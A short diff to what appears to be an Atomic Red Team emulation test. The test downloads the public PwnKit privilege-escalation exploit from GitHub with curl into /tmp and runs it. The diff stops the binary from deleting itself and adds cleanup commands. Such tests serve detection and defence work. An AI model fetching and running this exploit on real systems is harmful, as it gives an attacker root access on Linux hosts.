@@ -19,5 +19,8 @@ atomic_tests:
         cd /tmp
         test -f PwnKit || curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
         chmod +x ./PwnKit || exit
-        (sleep 1 && rm ./PwnKit & )
+        # (sleep 1 && rm ./PwnKit & )
         ./PwnKit
+    cleanup_command: |-
+      rm -r /tmp/.pkexec || :
+      rm /tmp/PwnKit || :
